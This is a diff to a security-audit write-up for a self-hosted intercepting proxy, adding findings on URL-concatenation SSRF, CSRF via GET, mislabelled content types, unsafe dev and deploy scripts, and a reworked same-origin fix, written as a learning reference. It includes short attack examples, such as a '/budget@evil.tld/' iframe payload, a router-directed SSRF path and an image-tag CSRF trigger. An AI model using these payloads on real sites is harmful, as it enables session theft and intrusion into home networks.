@@ -11,11 +11,17 @@ was fixed. Written as a learning reference — each finding is
 New to any of the words below? *Nonce*, *same-origin*, *least privilege* and the rest are
 all explained in plain English in [**CONCEPTS.md**](CONCEPTS.md).
 
-**Scorecard:** 12 findings fixed & verified live · 4 risks accepted by design · 172 tests green.
+**Scorecard:** 20 findings fixed · 4 risks accepted by design · 378 tests green.
 
 Findings F1–F5 came from an initial review of the design. **F6–F12 came later, from
 auditing the box that was actually running** — which is where the more serious ones were,
 and a reminder that reviewing a design is not the same as reviewing a deployment.
+**F13–F20 came from a third review of code the first two had already signed off** —
+including a HIGH that the design review had every opportunity to catch, and three findings
+(F16–F18) sitting in the scripts *around* the app rather than in it. That pass also re-opened
+**F9** for the second time; it finally closed by moving the pages to another origin instead
+of guarding them with one more header, and it is the most instructive entry here. All
+findings are verified live on the box.
 
 ---
 
@@ -115,6 +121,8 @@ redirect. Low on its own (it's your state), but the delivery vehicle for F2.
 **The fix.** Drop the wildcard CORS (every endpoint is same-origin), and reject
 cross-site POSTs to `/budget/*` at the proxy boundary via the browser's
 `Sec-Fetch-Site` header. Verified: cross-site → `403`, same-origin passes.
+*Incomplete as written — `/exit` is also reachable by `GET`, so this covered it in name
+only. Finished in **F14**.*
 
 **Concept — CSRF / confused deputy.** CSRF abuses your browser's trust — it attaches
 your context to a request another site triggered. Defenses assert intent: anti-CSRF
@@ -227,26 +235,111 @@ you discards every other guarantee it was making. Amend the one rule in the way.
 
 ---
 
-## F9 — Monitoring pages readable by any script on a gated site  ·  MEDIUM  ·  FIXED
+## F9 — Monitoring pages readable by any script on a gated site  ·  MEDIUM  ·  FIXED (at the third attempt)
 
 **What it is.** `/budget/stats`, `/health`, `/devices`, `/remaining` and `/feed` are served
 on the *gated site's* origin. Any script running on that site — a malicious ad, a
-compromised third-party include — was same-origin with them.
+compromised third-party include — is same-origin with them.
 
 **How it bit us.** `fetch('/budget/devices?fmt=json')` from a page on Reddit returned
 device names, OS versions, tailnet addresses and traffic volumes. Home-network
 reconnaissance, handed to a page the user had chosen to decrypt.
 
-**The fix.** Headers alone can't help — our gate page and the site's own pages are the
-same origin, so `Sec-Fetch-Site` is identical for both. So: allow a real navigation
-(`Sec-Fetch-Dest: document`, a *forbidden header name* scripts cannot forge) **or** a token
-only Cooldown's pages carry — and those pages can't be fetched by script either, so the
-token can't be harvested. The two conditions reinforce each other. Verified through the
-live proxy: scripted fetch 403, navigation 200, token'd poll 200.
+**The first fix — and why it did not hold.** Headers alone can't separate our pages from
+the site's: same origin, identical `Sec-Fetch-Site`. So the rule became *allow a real
+navigation **or** a token only Cooldown's pages carry* — reasoning that `Sec-Fetch-*` are
+forbidden header names a script cannot forge, and that the pages holding the token could
+not be fetched by script either, so it could never be harvested. **Both halves of that
+were wrong**, and a later review found each independently:
 
-**The concept — same-origin is a weak boundary when you *add* pages to someone's origin.**
-Injecting your own endpoints into a site you don't control means its scripts inherit access
-to them. Prefer a separate origin; if you can't, require something a script cannot produce.
+1. **`navigate` does not mean "a person typed this."** The check accepted
+   `Sec-Fetch-Dest: document` *or* `Sec-Fetch-Mode: navigate`. A same-origin `<iframe>`
+   sends `Dest: iframe, Mode: navigate` — it *is* a navigation, just of a nested browsing
+   context — and because it is same-origin, the parent reads the result straight out of
+   `contentDocument`. The header was unforgeable, as claimed. It just didn't mean what the
+   check assumed it meant.
+
+2. **The gate page carried the master token.** The one page deliberately left
+   script-readable — the gate has to render in place of a site — was stamped with the same
+   `ui_token` as the monitoring pages. So: `fetch('/budget')`, regex out
+   `<meta name="cd-tok">`, replay it anywhere. The token was persisted in Redis, so once
+   stolen it stayed stolen across restarts.
+
+```
+  a script on reddit.com wants /budget/devices
+
+  fetch()                       Dest: empty     → 403 ✓   the one case the fix was tested against
+  <iframe src="/budget/…">      Dest: iframe    → 200 ✗   parent reads contentDocument
+  fetch('/budget') → cd-tok     Dest: empty     → 200 ✗   token replayed on every endpoint
+```
+
+**The second fix.** Three changes, each closing one assumption:
+
+- **A navigation is `Sec-Fetch-Dest: document`, and only that.** The `Mode: navigate`
+  alternative is gone, which drops iframes, `<embed>` and `<object>`.
+- **Two tokens, two blast radii.** The gate — script-readable by construction — now carries
+  only `feed_token`, which unlocks `/feed` and nothing else: two aggregate bytes-per-second
+  numbers, worth nothing to an attacker. `ui_token` exists solely in the monitoring pages,
+  which a script genuinely cannot fetch. Compared with `secrets.compare_digest`.
+- **Belt and braces on the response.** Flask's real content type is preserved (`/devices?fmt=json`
+  was being relabelled `text/html`), plus `nosniff`, `X-Frame-Options: DENY`,
+  `frame-ancestors 'none'`, `Referrer-Policy: no-referrer` and `Cache-Control: no-store`.
+
+Verified through the addon: scripted fetch 403, iframe 403, replayed gate token 403 on every
+monitoring endpoint, real navigation 200. Pinned by regression tests that fail against the
+first fix.
+
+**The third fix — taking the advice.** The second fix left one vector: `window.open` sends
+`Dest: document` and stays same-origin, so an ad that captures a single click could still
+read those pages. **No header closes that** — the popup is a genuine top-level navigation,
+and same-origin means same-origin. Two rounds of increasingly clever header checks were
+converging on a wall.
+
+So the pages moved, which is what this finding's own conclusion said to do the first time
+round. `/stats`, `/health`, `/devices`, `/remaining` and `/boot-ack` are now served **only
+on the box's own origin** (`http://<tailnet-ip>:5000`), never through the proxy. The gate
+links to them absolutely; the old `/budget/*` paths return a 302 to the new home so
+bookmarks survive. A script on a gated site is now **cross-origin** with them:
+
+```
+  BEFORE                                   AFTER
+  script on reddit.com                     script on reddit.com
+   └─ same-origin with /budget/health       └─ cross-origin with http://box:5000/health
+      every read is one header check           fetch      -> no CORS header, response withheld
+      away from being allowed                  iframe     -> document not readable
+                                               window.open-> window not readable
+                                            the BROWSER enforces it, not our header check
+```
+
+Supporting changes: Flask binds loopback **plus the tailscale0 address** — never `0.0.0.0`,
+so a missing firewall rule is not the only thing between `/devices` and the LAN — and port
+5000 joined the interface-scoped rules in `cooldown-redirect.sh` as the outer layer. The gate
+keeps `/feed` (its background polls it) with a token that unlocks nothing else, and the set
+of endpoints the proxy will serve on a gated origin drops from twelve to seven.
+
+Verified live: all four dashboard paths return 302 for `Dest: empty`, `iframe` **and
+`document`** — including the shape no header could have caught — while the dashboard answers
+200 on the box's own origin with no `Access-Control-Allow-Origin` anywhere in sight.
+
+**The concept — when the fix keeps needing another patch, the design is the bug.** Three
+lessons, in increasing order of what they cost.
+
+First: injecting your own endpoints into a site you don't control means its scripts inherit
+access to them. Same-origin is a boundary the browser enforces *for* you — and adding pages
+to someone else's origin puts you on the wrong side of it.
+
+Second: the original fix was tested against exactly the attack that motivated it — `fetch()`
+— and passed, which made it look finished. An unforgeable signal is only as good as your
+reading of what it signals, and a secret is only secret if *every* page carrying it is
+protected. Test the assumption a control rests on, not just the attack you already know.
+
+Third, and the one worth the most: **the first fix already named the right answer** — "prefer
+a separate origin; if you can't, require something a script cannot produce" — and then took
+the second clause, because it was the cheaper one. Two rounds of header cleverness later,
+the answer was still the first clause. When a mitigation needs a special case for iframes,
+then another for popups, that is not a series of small bugs; it is the design telling you it
+cannot hold. Rebuilding a boundary by hand loses to moving to the side of it that already
+has one.
 
 ---
 
@@ -303,6 +396,241 @@ indistinguishable from success.
 
 ---
 
+## F13 — A URL path could redirect the proxy's internal call off the box  ·  HIGH  ·  FIXED
+
+**What it is.** The addon serves the gate from any gated host's `/budget` path. It decided
+that with `path.startswith("/budget")`, then built the internal call by pasting the rest of
+the path onto the Flask address:
+
+```python
+sub = parts.path[len("/budget"):]
+resp = req.get(f"http://127.0.0.1:5000{sub}")
+```
+
+Ask for `/budget@evil.tld/` and that string becomes `http://127.0.0.1:5000@evil.tld/`.
+Every URL parser reads `127.0.0.1:5000` there as **userinfo** — a username and password —
+not as the host. The host is `evil.tld`.
+
+```
+  http://127.0.0.1:5000@evil.tld/
+         └──userinfo──┘ └─host─┘     "@" ends the userinfo — everything before
+                                      it is a username, not an address
+```
+
+**How it bit us.** Worse than it first looks, because of *where the answer is served*. The
+proxy fetched the attacker's page and handed the body back as `text/html` **on the gated
+site's own origin** — and since the proxy synthesises that response itself, none of the real
+site's headers (framing, CSP) come with it. So:
+
+```html
+<!-- on ANY website in the world -->
+<iframe src="https://www.reddit.com/budget@evil.tld/"></iframe>
+```
+
+renders attacker HTML with the origin `https://www.reddit.com`. No user interaction, nothing
+to click. Script in it reads `document.cookie` and makes authenticated same-origin calls to
+Reddit as you — and the same URL works for youtube.com, open.spotify.com and every one of the
+~95 news domains. Pointing it inward instead (`/budget@192.168.1.1/`) makes the Pi fetch your
+router's admin page and hand it to the browser: the same bug is also an SSRF into the network
+the box sits on.
+
+The irony is that this is F4 again, one layer along. `site_for_host` was carefully taught to
+match hosts by suffix rather than substring — and then the *path* was matched with
+`startswith` and concatenated raw.
+
+**The fix.** Two changes, neither of them a filter:
+
+- **Match the path exactly** — `== "/budget"` or `startswith("/budget/")`. As a bonus,
+  `reddit.com/budgeting` is Reddit's own page again; it used to be swallowed by this handler
+  and returned a 500.
+- **Refuse anything outside a closed set of endpoints** *before* a URL is built. There are
+  twelve Flask routes and they are all known at import time, so nothing attacker-shaped is
+  ever concatenated onto the base address.
+
+Verified against the addon with mitmproxy's flow harness — before: attacker HTML returned
+with `Content-Type: text/html` for `www.reddit.com`; after: the request never leaves
+`127.0.0.1:5000`. The regression test asserts that invariant directly (every outbound URL
+must still resolve to host `127.0.0.1`, port 5000) rather than checking a status code, so it
+keeps holding for inputs nobody has thought of yet.
+
+**The concept — never build a URL by concatenation, and don't trust a prefix to be a
+boundary.** `"/budget" + attacker_string` is the same class of mistake as `"SELECT … " + input`:
+the attacker supplies syntax, not just data, and `@` is syntax. Validate against a closed set
+of known-good values, then construct from *those* — the safe version of this code never sees
+the attacker's string at all. And note which check failed: `startswith` said "this path is
+mine" when it meant "this path begins with my name."
+
+---
+
+## F14 — CSRF protection keyed to the method, not the effect  ·  LOW  ·  FIXED
+
+**What it is.** F3 blocked cross-site **POSTs** to `/budget/*`. But `/exit` also accepts
+`GET`, because the study-mode exit button is an ordinary navigation
+(`window.location.assign("/budget/exit?site=youtube")`) rather than a form.
+
+**How it bit us.** `<img src="https://www.reddit.com/budget/exit?site=reddit">` on any page
+you visit ends your active session. Genuinely minor — it makes the gate *stricter*, not
+looser, and you re-enter with one tap — but it is a hole in a control whose stated scope was
+"the mutating endpoints," and the next endpoint someone exposes to `GET` might not be so
+harmless.
+
+**The fix.** The check now covers any request to a state-changing endpoint, not just POSTs:
+`/enter`, `/study`, `/exit`, `/heartbeat`, `/reflect`, `/boot-ack`. The endpoint list is the
+same closed set F13 introduced, so the two fixes hold each other up.
+
+**The concept — CSRF is about the effect, not the verb.** "Only POSTs change state" is a
+convention, not a guarantee, and the moment one `GET` breaks it the defence has a hole
+shaped exactly like that endpoint. Enumerate what changes state and defend *that*; letting
+the HTTP method stand in for the answer is how the exception gets missed.
+
+---
+
+## F15 — Every proxied response was relabelled `text/html`  ·  LOW  ·  FIXED
+
+**What it is.** The addon rebuilt each `/budget` response with a hardcoded
+`Content-Type: text/html; charset=utf-8`, discarding whatever Flask had said. So
+`/devices?fmt=json`, `/health?fmt=json` and `/feed` — real JSON — were delivered to the
+browser labelled as HTML, with no `nosniff` and nothing preventing them being framed.
+
+**How it bit us.** Latent rather than exploited, and worth stating plainly: the values in
+those payloads (Tailscale hostnames, `/proc/device-tree/model`) are DNS-safe in practice, so
+there is no known way to get markup into them today. The finding is the *distance* to a bug,
+not a bug: a response mislabelled as HTML is a stored-XSS sink the moment any field in it
+becomes attacker-influenced, and there was no `nosniff` behind it as a second line. The
+missing framing headers also mattered concretely — they're part of why F9's iframe read
+rendered at all.
+
+**The fix.** Preserve Flask's own `Content-Type`, and set the headers that cost nothing:
+`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`,
+`Content-Security-Policy: frame-ancestors 'none'`, `Referrer-Policy: no-referrer`,
+`Cache-Control: no-store`.
+
+**The concept — a content type is a security control, not metadata.** It tells the browser
+which parser to hand your bytes to, and "HTML" is the parser that executes things. Declare
+what a response actually is, add `nosniff` so the browser doesn't get creative, and set the
+free headers *before* you need them — the bug they defend against is usually written after
+the header was skipped.
+
+---
+
+## F16 — The dev script quietly undid two fixes  ·  MEDIUM  ·  FIXED
+
+**What it is.** `start.sh` — the "just run it locally" convenience script — invoked
+mitmdump with none of the flags the systemd unit is careful about:
+
+```
+  unit                                    start.sh (before)
+  --allow-hosts "<gated hosts only>"      (absent)  -> decrypts EVERY site you visit
+  --set confdir=/var/lib/.../mitmproxy    (absent)  -> generates a SECOND CA in ~/.mitmproxy
+  listener firewalled to tailscale0       (absent)  -> mitmproxy's default bind: 0.0.0.0
+```
+
+**How it bit us.** Running it turned the machine into an intercepting proxy for the whole
+internet, on every interface, under a certificate authority nobody was tracking — F1 and F5
+undone in a single command, by the file most likely to be run by someone trying the project
+out. The hardened path and the convenient path disagreed, and the convenient one wins.
+
+**The fix.** Rewritten: same `--allow-hosts` from the same generator the unit uses,
+`--listen-host 127.0.0.1`, and a clearly-labelled dev CA in a gitignored `.mitmproxy-dev/`
+(deliberately *not* the deployed one, which is mode 700 and owned by another account). It
+also refuses to start if the real services are running, instead of silently racing them for
+port 5000.
+
+**The concept — the convenient path is the real configuration.** Hardening the production
+launcher does nothing if a friendlier script next to it skips the flags. Every way to start
+the thing is a deployment; audit them all, or delete the ones you don't want people using.
+
+---
+
+## F17 — Deploy staged root-installed files in /tmp  ·  LOW  ·  FIXED
+
+**What it is.** `deploy.sh units` `scp`'d systemd unit files to `/tmp/cooldown-*.service` on
+the Pi, then ran `sudo install` on them into `/etc/systemd/system/`.
+
+**How it bit us.** `/tmp` is world-writable and the names were predictable, so any local
+unprivileged account on the box could swap a file between the copy and the install — and
+what gets installed is a systemd unit that runs as root. A narrow race on a single-user box,
+which is why it's LOW, but the payoff is a root shell.
+
+**The fix.** Stage in a `mktemp -d` directory (0700, unguessable name), install from there,
+and clean up via a trap so a failed run doesn't leave the staging dir behind.
+
+**The concept — predictable paths in shared directories are a handoff an attacker can
+intercept.** Anywhere a privileged process reads a file an unprivileged one could have
+written is a TOCTOU. The fix is never a check; it's a location only you can write to.
+
+---
+
+## F18 — The asset exemption list still matched by substring  ·  LOW  ·  FIXED
+
+**What it is.** F4 fixed substring host matching in `site_for_host`. The *exemption* list
+next to it — `IGNORED_HOSTS`, the CDN hosts deliberately let through ungated — kept the old
+`any(ignored in host ...)` test.
+
+**How it bit us.** `redd.it` is a substring of `redd.it.evil.example`. Contained by
+`--allow-hosts` in practice, so latent rather than live — but note the direction: an
+over-matching *gate* wrongly decrypts a site, while an over-matching *exemption* wrongly
+lets one through. The exemption list fails toward not doing its job.
+
+**The fix.** One `host_matches(host, patterns)` helper does suffix matching (plus port and
+case normalisation), and all three call sites — gated hosts, overlay hosts, ignored hosts —
+go through it. There is no longer a second place to get this wrong.
+
+**The concept — fix the pattern, not the instance.** F4 fixed the line that had the bug.
+The same bug six lines further down survived another two reviews because nobody went
+looking for *other* callers. When you fix a class of mistake, grep for the class.
+
+---
+
+## F19 — The installer advertised a dashboard URL that could not work  ·  LOW  ·  FIXED
+
+**What it is.** The installer's closing instructions offered `http://<this-box>:5000/stats`
+while the app bound `127.0.0.1` only — reachable from nowhere but the box itself.
+
+**How it bit us.** Not an exploit; a trap. The obvious way to make the documented URL work
+is to bind `0.0.0.0`, which hands every monitoring page — device names, tailnet addresses,
+usage history — to the LAN and to any public IPv6 address, unauthenticated. Documentation
+that only works if you weaken something is a vulnerability with a delay on it.
+
+**The fix.** The URL is now true: F9's origin move binds the tailnet address deliberately,
+behind an interface-scoped firewall rule, and the installer prints the address the app
+actually listens on.
+
+**The concept — wrong docs get "fixed" by users, in the worst available way.** A README that
+disagrees with the code is a standing invitation to change the code. Make the instruction
+true, or delete it.
+
+---
+
+## F20 — CSP: the check read a directive the browser wouldn't  ·  LOW  ·  FIXED
+
+**What it is.** F8's nonce logic decided whether our injected script was already permitted by
+reading `script-src`, falling back to `default-src`. Browsers resolve an inline `<script>`
+**element** against `script-src-elem` first, and only then `script-src`.
+
+```
+  Policy:  script-src 'unsafe-inline'; script-src-elem 'self'
+
+  our check  -> reads script-src, sees 'unsafe-inline' -> "already allowed", policy untouched
+  browser    -> reads script-src-elem 'self'           -> inline script BLOCKED
+```
+
+**How it bit us.** No heartbeat on such a site. And the heartbeat swallows its own errors by
+design, so nothing surfaces: **time silently stops being charged while browsing continues.**
+Not a breach — a failure of the thing the tool exists to do, in the fail-open direction, and
+the same shape as F12 reached by a different route.
+
+**The fix.** Pick the directive the browser will actually consult —
+`script-src-elem` → `script-src` → `default-src` — and add the nonce there. Tests cover all
+four shapes, including "leave it alone, their `unsafe-inline` already covers us."
+
+**The concept — model the spec's precedence, not the directive you remember.** A check that
+reads a *different* input than the enforcer is not a weak check, it's a decorative one. And
+when the failure mode is silent and fails open, nobody reports it — you only find it by
+reading the spec against the code.
+
+---
+
 ## Accepted by design
 
 Some risks are the cost of what the tool *is* — understood, bounded, documented,
@@ -347,7 +675,28 @@ not eliminated. Naming them is itself good practice.
 - **Review the deployment, not just the design.** F1–F5 came from reading the code.
   F6–F12 came from logging into the running box — and included the two most serious
   findings. A threat model is a hypothesis; the machine is the evidence.
+- **Audit the scripts around the app, not just the app.** F16–F18 were in a dev launcher,
+  a deploy script and an exemption list — none of them "the code", all of them able to
+  undo it. The installer, the helper script and the README are part of the attack surface
+  because they decide what actually runs.
 - **Verify the boundary, don't assert it.** Every fix here was checked against the thing
   itself: a new SSH connection before trusting the old one, a live fetch returning 403, a
   mutation test proving a new test actually fails when the protection is removed. A test
   that cannot fail is decoration.
+- **Turn each fixed class into something that fails automatically.** The findings that
+  repeated (F4→F18, F3→F14, F1/F5→F16) all repeated because the fix was a one-time edit
+  with nothing standing behind it. `tests/test_invariants.py` and `.githooks/pre-commit`
+  are the standing version: the tests assert *properties* derived from the code (every
+  route classified, every reachable mutating endpoint CSRF-checked, no path escaping the
+  loopback call), and the hook greps added lines for the exact shapes above. Both were
+  mutation-tested — each was shown to fail when the bug it targets is reintroduced,
+  because a check that cannot fail is decoration.
+- **Test the assumption, not just the attack.** F9's first fix passed every test written
+  for it, because those tests were the attack that prompted it. What was never checked was
+  the sentence the fix rested on — *"a script cannot reach these pages"* — which was true of
+  three pages and false of the fourth. Write down what a control assumes, then attack the
+  assumption.
+- **Re-read code that has already been reviewed.** F13–F15 were in files two prior passes
+  had gone through line by line, and F13 was a HIGH sitting in plain sight. A review that
+  starts from "this part was cleared" inherits the last reviewer's blind spots along with
+  their conclusions; the cheapest way to break that is a pass that hasn't read them.
